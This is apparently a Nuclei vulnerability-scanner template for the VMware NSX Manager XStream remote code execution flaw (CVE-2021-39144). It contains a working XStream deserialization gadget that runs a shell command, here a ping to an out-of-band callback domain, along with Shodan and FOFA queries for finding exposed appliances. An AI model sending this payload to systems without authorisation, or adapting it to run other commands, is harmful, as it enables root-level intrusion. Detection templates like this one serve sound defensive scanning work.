http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - deceptive request routing
  - status:
    - 400
    type: status
  matchers-condition: and
  payloads:
    os:
    - -c 3 lin
    - -n 3 win
  raw:
  - "PUT /api/2.0/services/usermgmt/password/{{lowerrstr}} HTTP/1.1\nHost: {{Hostname}}\n\
    Content-Type: application/xml\n\n<sorted-set>\n  <string>foo</string>\n  <dynamic-proxy>\n\
    \    <interface>java.lang.Comparable</interface>\n    <handler class=\"java.beans.EventHandler\"\
    >\n      <target class=\"java.lang.ProcessBuilder\">\n        <command>\n    \
    \      <string>bash</string>\n          <string>-c</string>\n          <string>ping\
    \ {{os}}.{{interactsh-url}}</string>\n        </command>\n      </target>\n  \
    \    <action>start</action>\n    </handler>\n  </dynamic-proxy>\n</sorted-set>"
  stop-at-first-match: true
id: vmware-nsx-stream-rce
info:
  author: _0xf4n9x_
  description: 'VMware Cloud Foundation (NSX-V) contains a remote code execution vulnerability
    via XStream open source library.

    VMware has evaluated the severity of this issue to be in the Critical severity
    range with a maximum CVSSv3 base score of 9.8.

    Due to an unauthenticated endpoint that leverages XStream for input serialization
    in VMware Cloud Foundation (NSX-V),

    a malicious actor can get remote code execution in the context of ''root'' on
    the appliance.

    VMware Cloud Foundation 3.x and more specific NSX Manager Data Center for vSphere
    up to and including version 6.4.13

    are vulnerable to Remote Command Injection.

    '
  metadata:
    fofa-query: title="VMware Appliance Management"
    max-request: 2
    shodan-query: title:"VMware Appliance Management"
    verified: true
  name: VMware NSX Manager XStream Pre-authenticated Remote Code Execution
  reference:
  - https://www.vmware.com/security/advisories/VMSA-2022-0027.html
  - https://kb.vmware.com/s/article/89809
  - https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html
  - https://attackerkb.com/topics/ngprN6bu76/cve-2021-39144
  - https://github.com/rapid7/metasploit-framework/pull/17222
  severity: high
  tags: vmware,xstream,rce,msf,intrusive,vuln
variables:
  lowerrstr: '{{to_lower(rand_text_alpha(6))}}'
